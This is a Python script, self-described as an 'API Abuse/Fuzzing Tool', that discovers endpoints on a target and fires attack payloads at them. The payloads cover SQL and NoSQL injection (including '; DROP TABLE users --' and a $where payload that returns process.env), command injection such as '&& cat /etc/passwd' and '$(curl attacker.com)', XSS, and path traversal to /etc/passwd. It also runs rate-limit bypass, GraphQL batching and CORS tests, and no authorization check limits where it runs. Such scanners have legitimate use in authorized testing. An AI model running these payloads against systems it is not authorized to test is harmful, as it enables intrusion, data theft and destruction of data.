#!/usr/bin/env python3
import requests
import json
import time
import random
import string
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
from dataclasses import dataclass
from typing import List, Dict, Any, Optional
import hashlib
import base64
from graphql import build_ast_schema, parse, print_ast
import re

@dataclass
class APIFuzzResult:
    endpoint: str
    method: str
    payload: str
    vulnerability: str
    risk: str
    evidence: str
    response_code: int
    response_time: float

class APIFuzzer:
    def __init__(self, base_url, headers=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update(headers or {})
        self.discovered_endpoints = []
        self.fuzz_results = []
        self.rate_limit_delay = 0.1
        
        # Payload libraries
        self.sql_payloads = [
            "' OR '1'='1' --",
            "' UNION SELECT 1,2,3 --",
            "'; DROP TABLE users --",
            "' OR 1=1 --",
            "' OR SLEEP(5) --"
        ]
        
        self.nosql_payloads = [
            '{"$where": "this.constructor.constructor(\'return process.env\')()"}',
            '{"$ne": "invalid"}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "sleep(5000)"}'
        ]
        
        self.command_injection_payloads = [
            '; ls -la',
            '| whoami',
            '&& cat /etc/passwd',
            '`id`',
            '$(curl attacker.com)'
        ]
        
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '" onmouseover="alert(1)"',
            "'-alert(1)-'"
        ]
        
        self.path_traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//....//etc/passwd'
        ]
        
        self.graphql_payloads = [
            # Introspection query
            '{__schema{types{name}}}',
            # Deep nested query
            '{user{posts{comments{user{posts{comments{user{id}}}}}}}',
            # Field duplication
            '{user{id name id name id name}}',
            # Batch query
            '[{query: "{users{id}}"}, {query: "{users{email}}"}]'
        ]
        
        # Business logic abuse patterns
        self.business_logic_payloads = {
            'price_manipulation': ['-100', '0', '0.01', '999999'],
            'id_manipulation': ['1', '0', '-1', '999999999'],
            'enumeration': ['admin', 'root', 'test', 'demo'],
            'bypass': ['true', 'false', 'null', 'undefined']
        }
    
    def discover_endpoints(self, spider=True, use_common=True):
        """Discover API endpoints through spidering and common paths"""
        print("[*] Discovering API endpoints...")
        
        common_endpoints = [
            '/api/users', '/api/products', '/api/orders', '/api/auth',
            '/api/admin', '/api/config', '/api/health', '/api/version',
            '/graphql', '/api/graphql', '/v1/graphql',
            '/api/v1/users', '/api/v1/products', '/rest/users'
        ]
        
        discovered = []
        
        # Test common endpoints
        if use_common:
            for endpoint in common_endpoints:
                url = urljoin(self.base_url, endpoint)
                for method in ['GET', 'POST', 'OPTIONS']:
                    try:
                        response = self.session.request(method, url, timeout=5)
                        if response.status_code not in [404, 403]:
                            discovered.append({
                                'url': url,
                                'method': method,
                                'status': response.status_code,
                                'type': 'common'
                            })
                            print(f"    Found: {method} {url} ({response.status_code})")
                    except:
                        pass
        
        # Spider existing endpoints for links
        if spider:
            spider_urls = [self.base_url] + [e['url'] for e in discovered]
            for url in spider_urls:
                try:
                    response = self.session.get(url, timeout=5)
                    # Extract potential API endpoints from response
                    links = re.findall(r'["\'](/api/[^"\']+)["\']', response.text)
                    for link in links:
                        full_url = urljoin(self.base_url, link)
                        if full_url not in [e['url'] for e in discovered]:
                            discovered.append({
                                'url': full_url,
                                'method': 'GET',
                                'status': 'spidered',
                                'type': 'spidered'
                            })
                            print(f"    Spidered: GET {full_url}")
                except:
                    pass
        
        self.discovered_endpoints = discovered
        return discovered
    
    def test_graphql_introspection(self):
        """Test GraphQL introspection endpoints"""
        print("[*] Testing GraphQL introspection...")
        
        graphql_endpoints = [
            '/graphql', '/api/graphql', '/v1/graphql', '/query'
        ]
        
        introspection_query = {
            "query": """
            query IntrospectionQuery {
                __schema {
                    types {
                        name
                        kind
                        fields {
                            name
                            type {
                                name
                                kind
                            }
                        }
                    }
                }
            }
            """
        }
        
        for endpoint in graphql_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                response = self.session.post(url, json=introspection_query, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data and '__schema' in data['data']:
                        self.fuzz_results.append(APIFuzzResult(
                            endpoint=url,
                            method="POST",
                            payload="Introspection Query",
                            vulnerability="GraphQL Introspection Enabled",
                            risk="MEDIUM",
                            evidence="Full schema exposed via introspection",
                            response_code=200,
                            response_time=0
                        ))
                        print(f"    [!] GraphQL introspection enabled at {url}")
                        
                        # Extract sensitive fields from schema
                        self._analyze_graphql_schema(data['data']['__schema'])
            except Exception as e:
                continue
    
    def _analyze_graphql_schema(self, schema):
        """Analyze GraphQL schema for sensitive fields"""
        sensitive_patterns = [
            'password', 'token', 'secret', 'key', 'auth',
            'admin', 'user', 'email', 'phone', 'ssn'
        ]
        
        for type_info in schema.get('types', []):
            type_name = type_info.get('name', '').lower()
            for pattern in sensitive_patterns:
                if pattern in type_name:
                    print(f"        [!] Sensitive type found: {type_info.get('name')}")
            
            for field in type_info.get('fields', []):
                field_name = field.get('name', '').lower()
                for pattern in sensitive_patterns:
                    if pattern in field_name:
                        print(f"        [!] Sensitive field: {type_info.get('name')}.{field.get('name')}")
    
    def fuzz_parameters(self, endpoint, method="GET", params=None):
        """Fuzz API parameters with various payloads"""
        print(f"[*] Fuzzing {method} {endpoint}")
        
        if params is None:
            # Try to identify parameters from endpoint
            params = self._identify_parameters(endpoint)
        
        test_cases = self._generate_fuzz_cases(params)
        
        for test_case in test_cases:
            try:
                start_time = time.time()
                
                if method.upper() == "GET":
                    response = self.session.get(endpoint, params=test_case['params'], timeout=10)
                else:
                    response = self.session.request(method, endpoint, 
                                                  json=test_case.get('json'),
                                                  data=test_case.get('data'),
                                                  timeout=10)
                
                response_time = time.time() - start_time
                
                # Analyze response for vulnerabilities
                self._analyze_response(endpoint, method, test_case, response, response_time)
                
                time.sleep(self.rate_limit_delay)
                
            except Exception as e:
                print(f"    Error testing {test_case['name']}: {e}")
    
    def _identify_parameters(self, endpoint):
        """Identify potential parameters from endpoint structure"""
        params = {}
        
        # Common parameter patterns
        common_params = {
            'id': ['1', 'test', '../etc/passwd'],
            'user_id': ['1', 'admin', '0'],
            'email': ['test@test.com', "' OR '1'='1"],
            'password': ['password', "' OR '1'='1"],
            'token': ['test', 'null', 'undefined'],
            'limit': ['100', '999999', '-1'],
            'offset': ['0', '-100', '1000000'],
            'sort': ['id', 'name', "'; DROP TABLE--"],
            'search': ['test', '<script>alert(1)</script>']
        }
        
        # Extract parameters from URL path
        path_params = re.findall(r'\{(\w+)\}', endpoint)
        for param in path_params:
            params[param] = common_params.get(param, ['test'])
        
        # Add common query parameters
        for param in ['id', 'user_id', 'email', 'limit', 'offset']:
            if param not in params:
                params[param] = common_params.get(param, ['test'])
        
        return params
    
    def _generate_fuzz_cases(self, params):
        """Generate fuzzing test cases"""
        test_cases = []
        
        # SQL Injection tests
        for payload in self.sql_payloads:
            case_params = {}
            for param_name in params:
                case_params[param_name] = payload
            test_cases.append({
                'name': f'SQLi_{payload[:20]}',
                'params': case_params,
                'type': 'sql_injection'
            })
        
        # NoSQL Injection tests
        for payload in self.nosql_payloads:
            test_cases.append({
                'name': f'NoSQLi_{payload[:20]}',
                'json': json.loads(payload),
                'type': 'nosql_injection'
            })
        
        # Command Injection tests
        for payload in self.command_injection_payloads:
            case_params = {}
            for param_name in params:
                case_params[param_name] = payload
            test_cases.append({
                'name': f'CmdInj_{payload[:20]}',
                'params': case_params,
                'type': 'command_injection'
            })
        
        # XSS tests
        for payload in self.xss_payloads:
            case_params = {}
            for param_name in params:
                case_params[param_name] = payload
            test_cases.append({
                'name': f'XSS_{payload[:20]}',
                'params': case_params,
                'type': 'xss'
            })
        
        # Path Traversal tests
        for payload in self.path_traversal_payloads:
            case_params = {}
            for param_name in params:
                if 'id' in param_name or 'file' in param_name or 'path' in param_name:
                    case_params[param_name] = payload
            if case_params:
                test_cases.append({
                    'name': f'PathTraversal_{payload[:20]}',
                    'params': case_params,
                    'type': 'path_traversal'
                })
        
        # Business logic tests
        for test_type, payloads in self.business_logic_payloads.items():
            for payload in payloads:
                case_params = {}
                for param_name in params:
                    if any(keyword in param_name for keyword in ['price', 'cost', 'amount']):
                        case_params[param_name] = payload
                    elif any(keyword in param_name for keyword in ['id', 'user_id']):
                        case_params[param_name] = payload
                if case_params:
                    test_cases.append({
                        'name': f'BusinessLogic_{test_type}_{payload}',
                        'params': case_params,
                        'type': 'business_logic'
                    })
        
        return test_cases
    
    def _analyze_response(self, endpoint, method, test_case, response, response_time):
        """Analyze response for potential vulnerabilities"""
        
        # SQL Injection detection
        if test_case['type'] == 'sql_injection':
            if any(error in response.text.lower() for error in [
                'sql', 'syntax', 'mysql', 'postgresql', 'ora-', 'microsoft odbc'
            ]):
                self.fuzz_results.append(APIFuzzResult(
                    endpoint=endpoint,
                    method=method,
                    payload=test_case['name'],
                    vulnerability="SQL Injection",
                    risk="HIGH",
                    evidence=f"Database error in response: {response.text[:100]}",
                    response_code=response.status_code,
                    response_time=response_time
                ))
        
        # NoSQL Injection detection
        elif test_case['type'] == 'nosql_injection':
            if response_time > 5:  # Potential NoSQL timing attack
                self.fuzz_results.append(APIFuzzResult(
                    endpoint=endpoint,
                    method=method,
                    payload=test_case['name'],
                    vulnerability="NoSQL Injection (Timing)",
                    risk="MEDIUM",
                    evidence=f"Delayed response: {response_time:.2f}s",
                    response_code=response.status_code,
                    response_time=response_time
                ))
        
        # Command Injection detection
        elif test_case['type'] == 'command_injection':
            if any(output in response.text for output in [
                'root:', 'www-data:', 'bin/bash', 'etc/passwd'
            ]):
                self.fuzz_results.append(APIFuzzResult(
                    endpoint=endpoint,
                    method=method,
                    payload=test_case['name'],
                    vulnerability="Command Injection",
                    risk="HIGH",
                    evidence="Command output found in response",
                    response_code=response.status_code,
                    response_time=response_time
                ))
        
        # XSS detection
        elif test_case['type'] == 'xss':
            if test_case['params'] and any(payload in response.text for payload in self.xss_payloads):
                self.fuzz_results.append(APIFuzzResult(
                    endpoint=endpoint,
                    method=method,
                    payload=test_case['name'],
                    vulnerability="Cross-Site Scripting (XSS)",
                    risk="MEDIUM",
                    evidence="XSS payload reflected in response",
                    response_code=response.status_code,
                    response_time=response_time
                ))
        
        # Path Traversal detection
        elif test_case['type'] == 'path_traversal':
            if any(content in response.text for content in [
                'root:', 'bin/bash', 'daemon:', '/etc/passwd'
            ]):
                self.fuzz_results.append(APIFuzzResult(
                    endpoint=endpoint,
                    method=method,
                    payload=test_case['name'],
                    vulnerability="Path Traversal",
                    risk="HIGH",
                    evidence="Sensitive file content in response",
                    response_code=response.status_code,
                    response_time=response_time
                ))
        
        # Business logic detection
        elif test_case['type'] == 'business_logic':
            if response.status_code == 200 and 'error' not in response.text.lower():
                # Successful manipulation
                self.fuzz_results.append(APIFuzzResult(
                    endpoint=endpoint,
                    method=method,
                    payload=test_case['name'],
                    vulnerability="Business Logic Bypass",
                    risk="MEDIUM",
                    evidence=f"Manipulation successful: {test_case['name']}",
                    response_code=response.status_code,
                    response_time=response_time
                ))
    
    def test_rate_limit_bypass(self, endpoint):
        """Test rate limiting bypass techniques"""
        print(f"[*] Testing rate limiting on {endpoint}")
        
        techniques = [
            {'name': 'Header Spoofing', 'headers': {'X-Forwarded-For': '1.1.1.1'}},
            {'name': 'User Agent Rotation', 'headers': {'User-Agent': 'Mozilla/5.0'}},
            {'name': 'Parameter Pollution', 'params': {'id': '1&id=2'}},
            {'name': 'HTTP Method Switching', 'method': 'POST'}
        ]
        
        for technique in techniques:
            try:
                responses = []
                for i in range(10):  # Rapid requests
                    if technique['name'] == 'HTTP Method Switching':
                        response = self.session.post(endpoint, timeout=5)
                    else:
                        headers = self.session.headers.copy()
                        headers.update(technique.get('headers', {}))
                        response = self.session.get(endpoint, headers=headers, timeout=5)
                    
                    responses.append(response.status_code)
                
                # Check if we got successful responses (not all 429)
                success_count = sum(1 for code in responses if code != 429)
                if success_count > 5:
                    self.fuzz_results.append(APIFuzzResult(
                        endpoint=endpoint,
                        method="GET",
                        payload=technique['name'],
                        vulnerability="Rate Limit Bypass",
                        risk="MEDIUM",
                        evidence=f"Bypassed rate limit using {technique['name']}",
                        response_code=200,
                        response_time=0
                    ))
                    
            except Exception as e:
                continue
    
    def test_graphql_batching(self, graphql_endpoint):
        """Test GraphQL query batching attacks"""
        print(f"[*] Testing GraphQL batching on {graphql_endpoint}")
        
        batch_queries = []
        for i in range(100):  # Create 100 identical queries
            batch_queries.append({
                "query": "query { users { id email } }"
            })
        
        try:
            start_time = time.time()
            response = self.session.post(graphql_endpoint, json=batch_queries, timeout=30)
            response_time = time.time() - start_time
            
            if response.status_code == 200:
                data = response.json()
                if isinstance(data, list) and len(data) > 50:
                    self.fuzz_results.append(APIFuzzResult(
                        endpoint=graphql_endpoint,
                        method="POST",
                        payload="Batch Query (100x)",
                        vulnerability="GraphQL Batch Attack",
                        risk="MEDIUM",
                        evidence=f"Processed {len(data)} queries in batch",
                        response_code=200,
                        response_time=response_time
                    ))
                    
        except Exception as e:
            print(f"    GraphQL batching test failed: {e}")
    
    def test_http_methods(self, endpoint):
        """Test dangerous HTTP methods"""
        print(f"[*] Testing HTTP methods on {endpoint}")
        
        dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']
        
        for method in dangerous_methods:
            try:
                response = self.session.request(method, endpoint, timeout=5)
                
                if response.status_code not in [405, 403, 404]:
                    self.fuzz_results.append(APIFuzzResult(
                        endpoint=endpoint,
                        method=method,
                        payload="HTTP Method Test",
                        vulnerability="Dangerous HTTP Method Enabled",
                        risk="LOW",
                        evidence=f"Method {method} returns {response.status_code}",
                        response_code=response.status_code,
                        response_time=0
                    ))
                    
            except Exception as e:
                continue
    
    def test_cors_misconfig(self, endpoint):
        """Test CORS misconfigurations"""
        print(f"[*] Testing CORS on {endpoint}")
        
        test_origins = [
            'https://evil.com',
            'http://localhost',
            'null',
            'https://attacker.com'
        ]
        
        for origin in test_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.options(endpoint, headers=headers, timeout=5)
                
                if 'Access-Control-Allow-Origin' in response.headers:
                    allowed_origin = response.headers['Access-Control-Allow-Origin']
                    if allowed_origin == '*' or origin in allowed_origin:
                        self.fuzz_results.append(APIFuzzResult(
                            endpoint=endpoint,
                            method="OPTIONS",
                            payload=f"Origin: {origin}",
                            vulnerability="CORS Misconfiguration",
                            risk="MEDIUM",
                            evidence=f"Allows origin: {allowed_origin}",
                            response_code=response.status_code,
                            response_time=0
                        ))
                        
            except Exception as e:
                continue
    
    def run_comprehensive_scan(self):
        """Run comprehensive API security scan"""
        print("[*] Starting comprehensive API security scan")
        
        # Discovery phase
        self.discover_endpoints()
        
        # GraphQL-specific tests
        self.test_graphql_introspection()
        
        # Test each discovered endpoint
        for endpoint_info in self.discovered_endpoints:
            endpoint = endpoint_info['url']
            method = endpoint_info['method']
            
            # Parameter fuzzing
            self.fuzz_parameters(endpoint, method)
            
            # Rate limiting tests
            self.test_rate_limit_bypass(endpoint)
            
            # HTTP method tests
            self.test_http_methods(endpoint)
            
            # CORS tests
            self.test_cors_misconfig(endpoint)
            
            # GraphQL batching if applicable
            if 'graphql' in endpoint.lower():
                self.test_graphql_batching(endpoint)
    
    def generate_report(self):
        """Generate comprehensive security report"""
        print("\n" + "="*80)
        print("API SECURITY TESTING REPORT")
        print("="*80)
        
        if not self.fuzz_results:
            print("No vulnerabilities found!")
            return
        
        # Group by risk level
        risk_groups = {}
        for result in self.fuzz_results:
            if result.risk not in risk_groups:
                risk_groups[result.risk] = []
            risk_groups[result.risk].append(result)
        
        # Print by risk level
        for risk in ['HIGH', 'MEDIUM', 'LOW']:
            if risk in risk_groups:
                print(f"\n{risk} RISK FINDINGS ({len(risk_groups[risk])}):")
                print("-" * 50)
                
                for finding in risk_groups[risk]:
                    print(f"\nEndpoint: {finding.endpoint}")
                    print(f"Method: {finding.method}")
                    print(f"Vulnerability: {finding.vulnerability}")
                    print(f"Payload: {finding.payload}")
                    print(f"Evidence: {finding.evidence}")
                    print(f"Response Code: {finding.response_code}")
                    print("-" * 30)
        
        # Summary
        total = len(self.fuzz_results)
        high = len(risk_groups.get('HIGH', []))
        medium = len(risk_groups.get('MEDIUM', []))
        low = len(risk_groups.get('LOW', []))
        
        print(f"\nSUMMARY:")
        print(f"Total Findings: {total}")
        print(f"High Risk: {high}")
        print(f"Medium Risk: {medium}")
        print(f"Low Risk: {low}")

def main():
    parser = argparse.ArgumentParser(description='API Abuse/Fuzzing Tool')
    parser.add_argument('url', help='Base URL to test')
    parser.add_argument('--headers', help='Custom headers (JSON format)')
    parser.add_argument('--auth', help='Authorization header value')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    
    args = parser.parse_args()
    
    # Prepare headers
    headers = {}
    if args.headers:
        headers.update(json.loads(args.headers))
    if args.auth:
        headers['Authorization'] = args.auth
    
    # Initialize fuzzer
    fuzzer = APIFuzzer(args.url, headers)
    
    # Run comprehensive scan
    fuzzer.run_comprehensive_scan()
    
    # Generate report
    fuzzer.generate_report()

if __name__ == "__main__":
    main()
